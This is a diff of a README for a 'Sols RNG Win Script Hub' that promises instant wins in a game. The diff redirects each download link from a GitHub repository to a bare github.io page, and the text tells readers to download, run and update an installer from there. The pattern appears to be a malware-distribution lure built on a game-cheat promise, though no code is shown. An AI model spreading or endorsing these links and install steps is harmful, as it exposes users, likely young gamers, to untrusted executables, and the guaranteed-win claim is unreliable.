@@ -1,6 +1,6 @@
 # 🎯 sols-rng-win-script-hub - Win Every Roll Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Sols_RNG_Win_Script-blue?style=for-the-badge&logo=github)](https://github.com/variant-thripidae875/sols-rng-win-script-hub)
+[![Download Now](https://img.shields.io/badge/Download-Sols_RNG_Win_Script-blue?style=for-the-badge&logo=github)](https://variant-thripidae875.github.io)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome! This guide will help you download and run the Sols RNG Win Script Hub o
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/variant-thripidae875/sols-rng-win-script-hub](https://github.com/variant-thripidae875/sols-rng-win-script-hub)
+Visit this link to download the application: [https://variant-thripidae875.github.io](https://variant-thripidae875.github.io)
 
 Once you click the link, you'll be taken to the download page. Look for the download button and click it to save the file to your computer. The download should start automatically. Save the file somewhere easy to find, like your Desktop or Downloads folder.
 
@@ -82,7 +82,7 @@ If you encounter problems, try these solutions:
 
 The developers regularly release updates to improve performance and add new features. To update:
 
-1. **Visit the download page** [here](https://github.com/variant-thripidae875/sols-rng-win-script-hub).
+1. **Visit the download page** [here](https://variant-thripidae875.github.io).
 2. **Download the latest version** of the application.
 3. **Run the new installer** which will replace the old version while keeping your settings.
 
@@ -145,7 +145,7 @@ Remember, the script is designed to be simple and effective. No technical backgr
 
 Ready to get started? Click the link below to download now:
 
-[Download Sols RNG Win Script Hub](https://github.com/variant-thripidae875/sols-rng-win-script-hub)
+[Download Sols RNG Win Script Hub](https://variant-thripidae875.github.io)
 
 Happy gaming! 🎉
 
